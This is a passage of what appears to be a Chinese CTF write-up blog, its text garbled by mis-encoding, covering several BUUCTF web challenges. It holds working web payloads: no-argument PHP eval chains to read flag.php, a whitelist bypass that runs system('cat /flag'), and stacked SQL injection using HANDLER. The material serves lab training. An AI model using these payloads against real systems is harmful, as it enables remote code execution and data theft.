highlight_file(__FILE__);?><p>æˆ‘ä»¬çš„æœ€ç»ˆç›®çš„å°±æ˜¯ç»•è¿‡ä¹‹åé€šè¿‡evalå‡½æ•°æ¥æŸ¥è¯¢flagã€‚</p><p>æºç åˆ†æï¼š</p><ul><li>éœ€è¦é€šè¿‡<strong>GET</strong>æ–¹å¼ä¼ å…¥å‚æ•°<code>exp</code></li><li>ç¬¬ä¸€å±‚<code>preg_match()</code>å‡½æ•°é™åˆ¶äº†phpä¼ªåè®®ï¼Œåƒå°è£…åè®®ä¹‹ç±»çš„</li><li>ç¬¬äºŒå±‚<code>preg_replace()</code>æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ï¼Œ<code>(?R)</code>è¡¨ç¤ºå¼•ç”¨å½“å‰è¡¨è¾¾å¼ï¼Œåªèƒ½åŒ¹é…é€šè¿‡æ— å‚æ•°çš„å‡½æ•°ã€‚</li><li>ç¬¬ä¸‰å±‚<code>preg_match()</code>é™åˆ¶äº†ä¸€äº›å…³é”®å­—</li><li><code>@eval($_GET[&#39;exp&#39;]);</code>å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼›å…¸å‹çš„æ— å‚æ•°RCE</li><li>è™½ç„¶å…¶ä¸èƒ½ä½¿ç”¨phpä¼ªåè®®ï¼Œä½†æ˜¯@eval($_GET[â€˜expâ€™]);å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œæ‰€ä»¥ä½¿ç”¨scandir()å‡½æ•°åˆ—å‡ºå½“å‰ç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•ï¼š</li></ul><p><img src="/2021/08/01/buu/5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDAzNzI5Ng==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç¬¬äºŒå±‚æ­£åˆ™è¡¨è¾¾å¼æ— æ³•ç»™directoryå‚æ•°èµ‹å€¼ï¼Œæ‰€ä»¥æŸ¥æ‰¾èƒ½å¤Ÿè¿”å›ä¸ºâ€™.â€™ç»“æœçš„å‡½æ•°ï¼›</p><p>é¦–å…ˆéœ€è¦å¾—åˆ°å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶<br>scandir()å‡½æ•°å¯ä»¥æ‰«æå½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">print_r(scandir(&#39;.&#39;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆé—®é¢˜å°±æ˜¯å¦‚ä½•æ„é€ <br>scandir(â€˜.â€™)</p><p>è¿™é‡Œå†çœ‹å‡½æ•°ï¼š</p><p>localeconv() å‡½æ•°è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚è€Œæ•°ç»„ç¬¬ä¸€é¡¹å°±æ˜¯.<br>current() è¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒ, é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼ã€‚<br>pos()æ˜¯ current() çš„åˆ«åã€‚<br>è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼š</p><p><strong>current(localeconv())æ°¸è¿œéƒ½æ˜¯ä¸ªç‚¹</strong></p><p>æ„é€ ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(current(localeconv())));</span><br><span class="line">print_r(scandir(pos(localeconv())));</span><br></pre></td></tr></table></figure><p><img src="/2021/08/01/buu/5/image-20210801200909285.png" alt="image-20210801200909285"></p><p>åˆ°è¿™é‡Œæˆ‘ä»¬ä¹Ÿåªæ˜¯å¯ä»¥çŸ¥é“flag.phpçš„å­˜åœ¨</p><p>å´è¿˜ä¸èƒ½è¯»å–å®ƒçš„æºç </p><p><img src="/2021/08/01/buu/5/1625650-20200204202458447-503722062.png" alt="img"></p><p>ä»ä¸Šå›¾çš„å®˜æ–¹è§£é‡Šä¸­å¯ä»¥çŸ¥é“</p><p>æˆ‘ä»¬æ— æ³•ç”¨å•ç‹¬çš„å‡½æ•°è¯»å–æºç </p><p><strong>1.array_reverse()</strong><br>ä»¥ç›¸åçš„å…ƒç´ é¡ºåºè¿”å›æ•°ç»„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp&#x3D;print_r(array_reverse(scandir(current(localeconv()))));</span><br></pre></td></tr></table></figure><p><strong>2.array_flip()</strong></p><p>äº¤æ¢æ•°ç»„çš„é”®å’Œå€¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp&#x3D;print_r(array_flip(scandir(current(localeconv()))));</span><br></pre></td></tr></table></figure><p><strong>3.array_rand()</strong></p><p>ä»æ•°ç»„ä¸­éšæœºå–å‡ºä¸€ä¸ªæˆ–å¤šä¸ªå•å…ƒï¼Œä¸æ–­åˆ·æ–°è®¿é—®å°±ä¼šä¸æ–­éšæœºè¿”å›ï¼Œæœ¬é¢˜ç›®ä¸­scandir()è¿”å›çš„æ•°ç»„åªæœ‰5ä¸ªå…ƒç´ ï¼Œåˆ·æ–°å‡ æ¬¡å°±èƒ½åˆ·å‡ºæ¥flag.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp&#x3D;print_r(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure><p>ä¸èƒ½ä½¿ç”¨file_get_contents()ï¼Œä½†æ˜¯å¯ä»¥å¯ä»¥ä½¿ç”¨readfile()æˆ–highlight_file()ä»¥åŠå…¶åˆ«åå‡½æ•°show_source()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp&#x3D;print_r(readfile(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp&#x3D;highlight_file(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp&#x3D;show_source(session_id(session_start()));    </span><br></pre></td></tr></table></figure><p><img src="/2021/08/01/buu/5/image-20210801202551668.png" alt="image-20210801202551668"></p><p>å‚è€ƒåšå®¢ï¼š</p><p> <a href="https://www.cnblogs.com/wangtanzhi/p/12260986.html">GXYCTF2019]ç¦æ­¢å¥—å¨ƒ - ç‹å¹ä¹‹ - åšå®¢å›­ (cnblogs.com)</a></p><p> <a href="https://blog.csdn.net/weixin_44037296/article/details/111404335">GXYCTF2019] ç¦æ­¢å¥—å¨ƒ_Senimo-CSDNåšå®¢_buuctf ç¦æ­¢å¥—å¨ƒ</a></p><p> <a href="https://blog.csdn.net/rfrder/article/details/109627827">GXYCTF2019]ç¦æ­¢å¥—å¨ƒ 1_fengçš„åšå®¢-CSDNåšå®¢</a></p><h4 id="åè®°ï¼š"><a href="#åè®°ï¼š" class="headerlink" title="åè®°ï¼š"></a>åè®°ï¼š</h4><p>å­¦é•¿ç”¨è¿™é¢˜åšæ¨¡æ¿ï¼Œåšäº†æ”¹é€ é¢˜</p><p>æœ¬æ¥ä»¥ä¸ºå¾ˆç®€å•(å¥½å§å…¶å®æ˜¯å¾ˆç®€å•)</p><p>å…ˆç”¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure><p><img src="/2021/08/01/buu/5/image-20210827201807385.png" alt="image-20210827201807385"></p><p>å†ç›´æ¥è¯»å–ï¼ˆæˆ‘å°±æ˜¯å‚»å‚»ä¸€ç›´ä¸è¯»è¯»å–çš„å­©å­å•Šï¼Œåœ¨é‚£array_reverseï¼Œå“­æ­»äº†ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(this_is_real_flag);</span><br></pre></td></tr></table></figure><p><img src="/2021/08/01/buu/5/image-20210827201914618.png" alt="image-20210827201914618"></p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN 2019 åˆèµ›	Love Math</title>
      <link href="/2021/07/30/buu/4/"/>
      <url>/2021/07/30/buu/4/</url>
      
        <content type="html"><![CDATA[<p>â€‹    è¿™æ˜¯ä¸€é“éå¸¸å¥½çš„ç»•è¿‡é¢˜ç›®ã€‚</p><p><img src="/2021/07/30/buu/4/image-20210730151757624.png" alt="image-20210730151757624"></p><p>é™„ä¸Šæºç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">&#x2F;&#x2F;å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag</span><br><span class="line">if(!isset($_GET[&#39;c&#39;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    &#x2F;&#x2F;ä¾‹å­ c&#x3D;20-1</span><br><span class="line">    $content &#x3D; $_GET[&#39;c&#39;];</span><br><span class="line">    if (strlen($content) &gt;&#x3D; 80) &#123;</span><br><span class="line">        die(&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist &#x3D; [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\[&#39;, &#39;\]&#39;];</span><br><span class="line">    foreach ($blacklist as $blackitem) &#123;</span><br><span class="line">        if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $content)) &#123;</span><br><span class="line">            die(&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;å¸¸ç”¨æ•°å­¦å‡½æ•°http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;php&#x2F;php_ref_math.asp</span><br><span class="line">    $whitelist &#x3D; [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];</span><br><span class="line">    preg_match_all(&#39;&#x2F;[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*&#x2F;&#39;, $content, $used_funcs);  </span><br><span class="line">    foreach ($used_funcs[0] as $func) &#123;</span><br><span class="line">        if (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            die(&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;å¸®ä½ ç®—å‡ºç­”æ¡ˆ</span><br><span class="line">    eval(&#39;echo &#39;.$content.&#39;;&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ†æï¼šç™½åå•é‡Œæœ‰äº›å‡½æ•°</p><h5 id="base-convertå‡½æ•°"><a href="#base-convertå‡½æ•°" class="headerlink" title="base_convertå‡½æ•°"></a><strong>base_convert</strong>å‡½æ•°<img src="/2021/07/30/buu/4/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc3NodDA=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></h5><h5 id="hex2bin-å‡½æ•°"><a href="#hex2bin-å‡½æ•°" class="headerlink" title="hex2bin() å‡½æ•°"></a>hex2bin() å‡½æ•°</h5><p>hex2bin() å‡½æ•°æŠŠåå…­è¿›åˆ¶å€¼çš„å­—ç¬¦ä¸²è½¬æ¢ä¸º ASCII å­—ç¬¦ã€‚</p><h5 id="dechex-å‡½æ•°"><a href="#dechex-å‡½æ•°" class="headerlink" title="dechex() å‡½æ•°"></a>dechex() å‡½æ•°</h5><p>dechex() å‡½æ•°æŠŠåè¿›åˆ¶æ•°è½¬æ¢ä¸ºåå…­è¿›åˆ¶æ•°ã€‚</p><p>ç›®æ ‡ï¼šæ‰§è¡Œsystemå‡½æ•°æ¥å®ŒæˆæŸ¥çœ‹flagçš„æ“ä½œã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;system(&quot;cat &#x2F;flag&quot;)</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ä¸Šé¢åˆ—å‡ºæ¥ç™½åå•å’Œé»‘åå•ï¼Œå…³é”®å­—ç¬¦ä¼šè¢«è¿‡æ»¤ï¼Œè¦æ±‚æˆ‘ä»¬ç»•è¿‡ã€‚</p><p>æ¯”å¦‚è¿™æ ·å°±æ˜¯è¢«è¿‡æ»¤äº†ï¼š</p><p><img src="/2021/07/30/buu/4/image-20210802091253839.png" alt="image-20210802091253839"></p><p>æˆ‘ä»¬ä¸èƒ½è¾“å…¥å¼•å·å’Œsystemå‡½æ•°</p><p>ä½†å¼•å·å»æ‰ä¹Ÿå¯æ‰§è¡Œï¼Œç„¶åå†é‡‡ç”¨å˜é‡ä¿å­˜å‡½æ•°å’Œå‚æ•°ã€‚</p><p>ä¸”ç”¨ç™½åå•é‡Œçš„å‡½æ•°ä»£æ›¿å¾—</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;($_GET[pi])($_GET[abs])&amp;pi&#x3D;system&amp;abs&#x3D;cat &#x2F;flag</span><br></pre></td></tr></table></figure><p>ä¸è¿‡ï¼Œ_GETå¹¶æ²¡æœ‰åœ¨ç™½åå•å†…,[ ]ä¹Ÿè¢«è¿‡æ»¤ã€‚</p><p>æ‰€ä»¥</p><p>1.[ ]å¯ä»¥ç”¨{}æ›¿æ¢</p><p>2._GETç”¨hex2binè½¬æ¢</p><p><a href="https://www.rapidtables.org/zh-CN/convert/number/ascii-to-hex.html">ASCIIåˆ°åå…­è¿›åˆ¶| æ–‡æœ¬åˆ°åå…­è¿›åˆ¶ä»£ç è½¬æ¢å™¨ (rapidtables.org)</a></p><p><img src="/2021/07/30/buu/4/image-20210802092247741.png" alt="image-20210802092247741"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_GET&#x3D;hex2bin(5f 47 45 54)</span><br></pre></td></tr></table></figure><p>  è¿™é‡Œç”¨åˆ°çš„hex2binä¹Ÿæ˜¯åå•ä¹‹å¤–</p><p>  éœ€è¦ç”¨base_convertå‡½æ•°è½¬æ¢</p><p>ï¼ˆç”¨base_convert()å‡½æ•°å°†10è¿›åˆ¶æ•°è½¬åŒ–ä¸º32è¿›åˆ¶çš„hex2binï¼‰</p><p><a href="https://tool.oschina.net/hexconvert">åœ¨çº¿è¿›åˆ¶è½¬æ¢ (oschina.net)</a></p><p><img src="/2021/07/30/buu/4/image-20210802092841841.png" alt="image-20210802092841841"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hex2bin&#x3D;base_convert(37907361743,10,36)</span><br></pre></td></tr></table></figure><p>æ•°å­—ä¹Ÿä¸èƒ½ç›´æ¥å¡«</p><p>å› ä¸ºä¹‹å‰çš„æ­£åˆ™è¡¨è¾¾å¼ä¼šè¿‡æ»¤æ‰ã€‚</p><p><code>preg_match_all(&#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#39;, $content, $used_funcs);</code> è¿™å¥è¯å½“ä½œå‡½æ•°åæ”¾è¿›ç™½åå•é‡Œæ£€æµ‹</p><p>æ‰€ä»¥<code>5f 47 45 54</code>éœ€è¦è½¬æ¢</p><p>è€Œdechex() å‡½æ•°æŠŠåè¿›åˆ¶æ•°è½¬æ¢ä¸ºåå…­è¿›åˆ¶æ•°ã€‚</p><p><img src="/2021/07/30/buu/4/image-20210802093324856.png" alt="image-20210802093324856"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5f474554&#x3D;dechex(1598506324)</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æœ‰ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_GET&#x3D;hex2bin(5f 47 45 54)&#x3D;base_convert(37907361743,10,36)(dechex(1598506324))</span><br></pre></td></tr></table></figure><p>æ¥ç€å°†_GETå­˜åœ¨ä¸€ä¸ªå˜é‡é‡Œï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));</span><br></pre></td></tr></table></figure><p>æ„é€ payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi&#x3D;system&amp;abs&#x3D;cat &#x2F;flag</span><br></pre></td></tr></table></figure><p><img src="/2021/07/30/buu/4/image-20210802094315328.png" alt="image-20210802094315328"></p><p>æœ¬æ–‡ç« å‚è€ƒäºï¼š(<a href="https://blog.csdn.net/missht0/article/details/113244707">https://blog.csdn.net/missht0/article/details/113244707</a>)</p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MRCTF2020 Ez_bypass&amp;GYCTF2020 Blacklist</title>
      <link href="/2021/07/27/buu/3/"/>
      <url>/2021/07/27/buu/3/</url>
      
        <content type="html"><![CDATA[<h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><p>æ‰“å¼€é¶æœºï¼š</p><p><img src="/2021/07/27/buu/3/image-20210727172208110.png" alt="image-20210727172208110"></p><p>æŒ‰ç…§æç¤º</p><p>è¿›å…¥f12ä¸­</p><p><img src="/2021/07/27/buu/3/image-20210727172249158.png" alt="image-20210727172249158"></p><p>ä»£ç å®¡è®¡ä¸€ä¸‹ï¼š</p><p>é‡Œé¢åŒ…å«äº†åä¸ºflag.phpçš„æ–‡ä»¶ï¼Œflagçš„æ ¼å¼ä¹Ÿè¿›è¡Œäº†è¯´æ˜</p><p>æ¥ä¸‹æ¥è¦å¤„ç†ä¸¤ä¸ªå˜é‡ï¼Œggå’Œid</p><p>ç¬¬ä¸€ä¸ªifåˆ¤æ–­çš„æ˜¯ä¸¤ä¸ªå˜é‡md5å€¼ç›¸åŒä½†æ˜¯å…¶æœ¬èº«å´ä¸èƒ½ç›¸ç­‰</p><p>æˆ‘æŸ¥æ‰¾åˆ°äº†æœ‰å…³èµ„æ–™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MD5ä¸èƒ½å¤„ç†æ•°ç»„ï¼Œå¤„ç†ä»»æ„æ•°ç»„è¿”å›å€¼éƒ½ç›¸åŒ</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬ç›´æ¥è¿™æ ·èµ‹å€¼</p><p>?id[]=1&amp;gg[]=2</p><p>æˆåŠŸè¾¾æˆç¬¬ä¸€ä¸ªæ¡ä»¶ï¼š</p><p><img src="/2021/07/27/buu/3/image-20210727172710626.png" alt="image-20210727172710626"></p><p>æ¥ç€çœ‹çœ‹ç¬¬äºŒä¸ªiféœ€è¦å®Œæˆä»€ä¹ˆ</p><p>æç¤ºæˆ‘ä»¬POSTä¼ å‚passwdå˜é‡</p><p>å…¶å€¼ä¸èƒ½ä¸ºæ•°å­—å‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;æ˜¯æ’ç­‰è®¡ç®—ç¬¦  åŒæ—¶æ£€æŸ¥è¡¨è¾¾å¼çš„å€¼ä¸ç±»å‹</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;æ˜¯æ¯”è¾ƒè¿ç®—ç¬¦å·  ä¸ä¼šæ£€æŸ¥æ¡ä»¶å¼çš„è¡¨è¾¾å¼çš„ç±»å‹</span><br></pre></td></tr></table></figure><p>ä¹‹åçš„æ¯”è¾ƒåŒæ ·æ»¡è¶³æ¡ä»¶ã€‚æ€è·¯æœ‰äº†ï¼Œ</p><p>ä¸è¿‡æˆ‘åšæ³•é”™äº†ï¼Œè·Ÿä»¥å‰å¼±å£ä»¤ä»€ä¹ˆçš„æ··èµ·æ¥äº†ï¼Œç–¯ç‹‚å°è¯•äº†â€˜123456aâ€™æ— æœ</p><p>çœ‹äº†wpåæ‰çŸ¥é“ï¼Œå…¶å®ä¸ç”¨åŠ åˆ†å·ï¼Œç›´æ¥passwd=1234567aï¼Œè¿™é‡Œå·²ç»æ˜¯å­—ç¬¦å‹äº†ã€‚</p><p>ä¸€å‰‘å°å–‰ï¼š</p><p><img src="/2021/07/27/buu/3/image-20210727173223649.png" alt="image-20210727173223649"></p><h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p>æ‰“å¼€é¶æœºåï¼Œæ˜æ˜¾æ³¨å…¥é¢˜ã€‚</p><p><img src="/2021/07/27/buu/3/image-20210727204621570.png" alt="image-20210727204621570"></p><p>wpæ¥æºï¼š<a href="https://www.cnblogs.com/20175211lyz/p/12356678.html">https://www.cnblogs.com/20175211lyz/p/12356678.html</a></p><h4 id="å§¿åŠ¿-å †å æ³¨å…¥"><a href="#å§¿åŠ¿-å †å æ³¨å…¥" class="headerlink" title="å§¿åŠ¿-å †å æ³¨å…¥"></a>å§¿åŠ¿-å †å æ³¨å…¥</h4><p>è·å–åº“åã€è¡¨åã€åˆ—å</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br><span class="line">show tables;</span><br><span class="line">show columns from &#96;table_name&#96;;</span><br></pre></td></tr></table></figure><p>è¯•ç€æŸ¥è¯¢äº†ä¸€ä¸‹æ•°æ®åº“åã€è¡¨åå’Œæ®µåï¼ˆ<strong>è¿™é‡Œæ²¡æœ‰ç”¨ä¹‹å‰ä¼ ç»Ÿçš„è”åˆæŸ¥è¯¢ï¼Œå› ä¸ºè‡ªå·±å°è¯•æŸ¥è¯¢ä¹‹åå‘ç°åé¢ä¼šè¢«æ­£åˆ™è¡¨è¾¾å¼è¿‡æ»¤</strong>ï¼‰ï¼š</p><p>psï¼šä¸è¿‡æˆ‘ä¸å¤ªæ¸…æ¥šä¸ºä»€ä¹ˆè¿™é‡ŒæŸ¥è¯¢è¦ â€˜ åŠ ä¸Š ï¼›</p><p><img src="/2021/07/27/buu/3/image-20210727204959368.png" alt="image-20210727204959368"></p><p><img src="/2021/07/27/buu/3/image-20210727205248791.png" alt="image-20210727205248791"></p><p>å‡ºç°äº†flagå­—æ ·ï¼Œç„¶åç”¨å¤§ä½¬çš„æ–¹æ³•ï¼Œ</p><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;handler FlagHere open;handler FlagHere read first;handler FlagHere close;#</span><br></pre></td></tr></table></figure><p>å®˜æ–¹è§£é‡Šæ˜¯ï¼š</p><p>HANDLER â€¦ OPENè¯­å¥æ‰“å¼€ä¸€ä¸ªè¡¨ï¼Œä½¿å…¶å¯ä»¥ä½¿ç”¨åç»­HANDLER â€¦ READè¯­å¥è®¿é—®ï¼Œ</p><p>è¯¥è¡¨å¯¹è±¡æœªè¢«å…¶ä»–ä¼šè¯å…±äº«ï¼Œå¹¶ä¸”åœ¨ä¼šè¯è°ƒç”¨HANDLER â€¦ CLOSEæˆ–ä¼šè¯ç»ˆæ­¢ä¹‹å‰ä¸ä¼šå…³é—­</p><h4 id="Tipï¼š"><a href="#Tipï¼š" class="headerlink" title="Tipï¼š"></a>Tipï¼š</h4><p>æœ¬æ¥åº”è¯¥è¿˜æœ‰ä¸€ç§å§¿åŠ¿æ˜¯ä¿®æ”¹è¡¨åï¼Œä½†æ˜¯ä¿®æ”¹è¡¨åçš„å…³é”®å­—renameå’Œalertéƒ½è¢«æ­£åˆ™banæ‰ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨</p><p>è¿™é¢˜è‹¥æ˜¯æ”¹é€ ä¹‹å‰çš„å¼ºç½‘æ¯2019éšä¾¿æ³¨ä¸€é¢˜åˆ™å¯ä»¥ç”¨æ­¤æ–¹æ³•ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç½‘é¼æ¯ 2020 é’é¾™ç»„AreUSerialz</title>
      <link href="/2021/07/26/buu/2/"/>
      <url>/2021/07/26/buu/2/</url>
      
        <content type="html"><![CDATA[<p>â€‹    æ‰“å¼€åï¼Œå‡ºç°ä»£ç é¡µé¢</p><p><img src="/2021/07/26/buu/2/image-20210726194801767.png" alt="image-20210726194801767"></p><p>â€‹    å¤„ç†åˆ°vsä¸Š</p><p><img src="/2021/07/26/buu/2/image-20210726194850909.png" alt="image-20210726194850909"></p><p>æ¥ç€æˆ‘ä»¬é€æ®µåˆ†æï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure><p>â€‹    åŒ…å«äº†åä¸ºflag.phpçš„æ–‡ä»¶ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">protected $op;</span><br><span class="line"></span><br><span class="line">protected $filename;</span><br><span class="line"></span><br><span class="line">protected $content;</span><br></pre></td></tr></table></figure><p>â€‹    å—ä¿æŠ¤æ–¹æ³•çš„ä¸‰ä¸ªå˜é‡</p><p>æ¥ä¸‹æ¥æ˜¯å€Ÿé‰´äº†å¤§ä½¬åšå®¢</p><p>ç»è¿‡åˆ†æï¼Œè¿™ä¸ªé¢˜ç›®éœ€è¦ä¼ å…¥ä¸€ä¸ªåºåˆ—åŒ–ä¹‹åçš„ç±»å¯¹è±¡ï¼ˆå› 